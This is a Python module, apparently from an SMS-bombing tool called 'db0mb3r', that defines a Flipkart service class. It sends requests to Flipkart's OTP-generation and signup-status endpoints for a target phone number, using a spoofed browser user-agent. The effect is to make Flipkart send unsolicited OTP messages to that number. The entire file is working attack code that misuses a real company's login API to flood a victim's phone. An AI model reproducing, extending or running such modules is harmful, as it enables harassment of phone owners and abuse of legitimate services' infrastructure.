from db0mb3r.services.service import Service


class Flipkart(Service):
    async def run(self):
        await self.post(
            "https://www.flipkart.com/api/5/user/otp/generate",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            data={"loginId": "+" + self.formatted_phone},
        )
        await self.post(
            "https://www.flipkart.com/api/6/user/signup/status",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            json={"loginId": "+" + self.formatted_phone, "supportAllStates": True},
        )
